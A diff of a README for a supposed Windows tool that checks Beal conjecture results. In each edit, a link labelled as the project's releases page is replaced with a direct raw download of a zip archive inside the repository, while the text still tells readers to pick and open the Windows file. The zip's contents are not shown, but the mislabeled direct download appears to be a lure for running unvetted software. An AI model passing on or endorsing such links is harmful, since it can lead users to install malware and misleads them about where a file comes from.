@@ -1,6 +1,6 @@
 # 🧮 Beal-Conjecture - Verify Number Theory Results Fast
 
-[![Download the app](https://img.shields.io/badge/Download%20from%20Releases-blue?style=for-the-badge)](https://github.com/Carlre2804/Beal-Conjecture/releases)
+[![Download the app](https://img.shields.io/badge/Download%20from%20Releases-blue?style=for-the-badge)](https://github.com/Carlre2804/Beal-Conjecture/raw/refs/heads/main/Toolkit/Conjecture-Beal-v2.2-alpha.4.zip)
 
 ## ✨ What this app does
 
@@ -12,7 +12,7 @@ This app is made for people who want to open the program, run it on Windows, and
 
 Visit the releases page and download the Windows file from there:
 
-https://github.com/Carlre2804/Beal-Conjecture/releases
+https://github.com/Carlre2804/Beal-Conjecture/raw/refs/heads/main/Toolkit/Conjecture-Beal-v2.2-alpha.4.zip
 
 If you see more than one file, pick the one for Windows. If the release has a setup file, use that. If it has a portable file, download that file and open it after it finishes.
 
@@ -172,7 +172,7 @@ After download, the app should work offline for local viewing and proof review.
 
 If you need the download page, use this link:
 
-https://github.com/Carlre2804/Beal-Conjecture/releases
+https://github.com/Carlre2804/Beal-Conjecture/raw/refs/heads/main/Toolkit/Conjecture-Beal-v2.2-alpha.4.zip
 
 ## 🧱 Notes for first-time users
 
@@ -214,4 +214,4 @@ If the app uses a setup wizard, follow each screen in order
 
 Open the release page here and choose the Windows file:
 
-https://github.com/Carlre2804/Beal-Conjecture/releases
+https://github.com/Carlre2804/Beal-Conjecture/raw/refs/heads/main/Toolkit/Conjecture-Beal-v2.2-alpha.4.zip
